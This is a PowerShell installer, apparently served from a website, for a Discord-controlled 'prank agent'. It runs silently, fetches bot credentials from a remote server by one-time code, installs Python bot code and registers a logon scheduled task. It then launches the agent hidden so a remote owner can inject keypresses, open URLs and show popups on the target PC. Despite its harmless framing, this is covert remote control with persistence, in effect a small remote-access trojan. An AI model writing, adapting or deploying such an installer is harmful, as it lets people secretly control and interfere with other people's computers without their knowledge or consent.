#requires -Version 5.1
# prank-agent installer — owner-gated, non-destructive Discord prank bot.
# Served from <your-domain>/prank/install.ps1
#
# Silent install: no prompts, no console output (a log is written to the
# install dir). Config (.env) is passed base64-encoded via -Config or the
# PRANK_CONFIG environment variable, so the bot token is never hosted.
[CmdletBinding()]
param(
    [string]$InstallDir = "$env:USERPROFILE\prank-agent",
    [string]$TaskName = "PrankAgent",
    [string]$Config = "",
    [string]$Code = "",
    [string]$Base = "https://www.tykunanon.online",
    [switch]$NoAutostart,
    [switch]$NoStart
)

$ErrorActionPreference = "Stop"

function Write-Log {
    param([string]$Message)
    try {
        $line = "[{0}] {1}" -f (Get-Date).ToString("s"), $Message
        Add-Content -Path (Join-Path $InstallDir "install.log") -Value $line -ErrorAction SilentlyContinue
    } catch { }
}

function Write-TextFile {
    param([string]$Path, [string]$Content)
    [System.IO.File]::WriteAllText($Path, $Content, (New-Object System.Text.UTF8Encoding($false)))
}

try {
    New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null

    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { }

    if (-not $Config) { $Config = "$env:PRANK_CONFIG" }

    # one-time code: fetch the .env once, then it is deleted server-side
    if (-not $Config) { if (-not $Code) { $Code = "$env:PRANK_CODE" } }
    $Code = "$Code".Trim()
    if ("$env:PRANK_BASE") { $Base = "$env:PRANK_BASE" }
    if (-not $Config -and $Code) {
        try {
            $body = @{ code = $Code } | ConvertTo-Json -Compress
            $resp = Invoke-RestMethod -Method Post -Uri ($Base.TrimEnd("/") + "/api/prank/redeem") -ContentType "application/json" -Body $body -TimeoutSec 30
            if ($resp.env) {
                $Config = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes([string]$resp.env))
                Write-Log "Redeemed one-time .env code"
            } else {
                throw "redeem returned no env"
            }
        } catch {
            Write-Log ("Redeem failed: " + $_.Exception.Message)
            throw "One-time code could not be redeemed (already used, expired or wrong). Nothing was installed."
        }
    }

    $requirements = @'
discord.py>=2.3
pyautogui>=0.9.54
python-dotenv>=1.0
'@

    $configPy = @'
import os

from dotenv import load_dotenv

load_dotenv()

DISCORD_TOKEN = os.getenv("DISCORD_TOKEN", "").strip()
OWNER_ID = int(os.getenv("OWNER_ID", "0"))
ACTION_DELAY_SECONDS = float(os.getenv("ACTION_DELAY_SECONDS", "10"))
RICKROLL_URL = os.getenv("RICKROLL_URL", "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
POPUP_TEXT = os.getenv("POPUP_TEXT", "This computer is haunted.")


def validate():
    problems = []
    if not DISCORD_TOKEN or DISCORD_TOKEN == "your-bot-token":
        problems.append("DISCORD_TOKEN is missing. Put your bot token in .env")
    if OWNER_ID == 0:
        problems.append("OWNER_ID is missing. Put your Discord user ID in .env")
    return problems
'@

    $actionsPy = @'
import platform
import sys
import webbrowser

import pyautogui

import config

pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0.05

KEYS = {
    "space": "space",
    "enter": "enter",
    "left": "left",
    "right": "right",
    "esc": "esc",
}


def press_key(name):
    pyautogui.press(KEYS[name])


def beep():
    if platform.system() == "Windows":
        import winsound

        winsound.MessageBeep(winsound.MB_ICONEXCLAMATION)
    else:
        sys.stdout.write("\a")
        sys.stdout.flush()


def open_url():
    webbrowser.open(config.RICKROLL_URL)


def popup():
    import tkinter as tk
    from tkinter import messagebox

    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Notice", config.POPUP_TEXT)
    root.destroy()


ACTIONS = {
    "space": ("SPACE", lambda: press_key("space")),
    "enter": ("ENTER", lambda: press_key("enter")),
    "left": ("LEFT", lambda: press_key("left")),
    "right": ("RIGHT", lambda: press_key("right")),
    "esc": ("ESC", lambda: press_key("esc")),
    "beep": ("BEEP", beep),
    "rickroll": ("RICKROLL", open_url),
    "popup": ("POPUP", popup),
}
'@

    $agentPy = @'
import asyncio
import sys

import discord
from discord import app_commands

import actions
import config

DELAY = config.ACTION_DELAY_SECONDS


def is_owner(user_id):
    return user_id == config.OWNER_ID


async def run_action(name):
    await asyncio.sleep(DELAY)
    await asyncio.to_thread(actions.ACTIONS[name][1])


async def queue(interaction, name):
    if not is_owner(interaction.user.id):
        await interaction.response.send_message("Not yours.", ephemeral=True)
        return
    await interaction.response.send_message(
        f"Queued `{name}` in {DELAY:g}s.", ephemeral=True
    )
    asyncio.create_task(run_action(name))


class ActionButton(discord.ui.Button):
    def __init__(self, name, label):
        super().__init__(
            label=label,
            style=discord.ButtonStyle.secondary,
            custom_id=f"prank:{name}",
        )
        self.name = name

    async def callback(self, interaction):
        await queue(interaction, self.name)


class PanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        for name, (label, _) in actions.ACTIONS.items():
            self.add_item(ActionButton(name, label))


client = discord.Client(intents=discord.Intents.default())
tree = app_commands.CommandTree(client)


def make_action_command(name):
    async def callback(interaction: discord.Interaction):
        await queue(interaction, name)

    return app_commands.Command(
        name=name,
        description=f"Trigger {name} on the PC after {DELAY:g}s",
        callback=callback,
    )


for action_name in actions.ACTIONS:
    tree.add_command(make_action_command(action_name))


@tree.command(name="panel", description="Post the PC prank panel")
async def panel(interaction: discord.Interaction):
    if not is_owner(interaction.user.id):
        await interaction.response.send_message("Not yours.", ephemeral=True)
        return
    await interaction.response.send_message("PC PRANK PANEL", view=PanelView())


@client.event
async def on_ready():
    client.add_view(PanelView())
    try:
        await tree.sync()
    except discord.HTTPException as exc:
        print(f"Command sync failed: {exc}")
    print(f"Logged in as {client.user}. Owner ID: {config.OWNER_ID}")


def main():
    problems = config.validate()
    if problems:
        for problem in problems:
            print(f"- {problem}")
        sys.exit(1)
    client.run(config.DISCORD_TOKEN)


if __name__ == "__main__":
    main()
'@

    Write-TextFile (Join-Path $InstallDir "requirements.txt") $requirements
    Write-TextFile (Join-Path $InstallDir "config.py") $configPy
    Write-TextFile (Join-Path $InstallDir "actions.py") $actionsPy
    Write-TextFile (Join-Path $InstallDir "agent.py") $agentPy

    # .env comes from the base64 config when provided; otherwise keep an
    # existing file or fall back to blank defaults.
    $envPath = Join-Path $InstallDir ".env"
    if ($Config) {
        $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Config))
        if ($decoded.Trim()) { Write-TextFile $envPath $decoded }
    } elseif (-not (Test-Path $envPath)) {
        Write-TextFile $envPath "DISCORD_TOKEN=`nOWNER_ID=0`nACTION_DELAY_SECONDS=10`nRICKROLL_URL=https://www.youtube.com/watch?v=dQw4w9WgXcQ`nPOPUP_TEXT=This computer is haunted.`n"
    }

    Set-Location $InstallDir

    if (-not (Test-Path ".venv")) {
        & python -m venv .venv *> (Join-Path $InstallDir "install.log")
    }

    $py = Join-Path $InstallDir ".venv\Scripts\python.exe"
    & $py -m pip install --upgrade pip *>> (Join-Path $InstallDir "install.log")
    & $py -m pip install -r requirements.txt *>> (Join-Path $InstallDir "install.log")

    $pythonw = Join-Path $InstallDir ".venv\Scripts\pythonw.exe"
    $agent = Join-Path $InstallDir "agent.py"

    if (-not $NoAutostart) {
        $action = New-ScheduledTaskAction -Execute $pythonw -Argument "`"$agent`"" -WorkingDirectory $InstallDir
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings -Description "Owner-gated Discord prank agent" -Force | Out-Null
        Write-Log "Registered scheduled task '$TaskName'"
    }

    if (-not $NoStart) {
        Start-Process -FilePath $pythonw -ArgumentList "`"$agent`"" -WorkingDirectory $InstallDir -WindowStyle Hidden
        Write-Log "Agent started (pythonw, hidden)"
    }

    Write-Log "Install complete in $InstallDir"
} catch {
    Write-Log ("FAILED: " + $_.Exception.Message)
}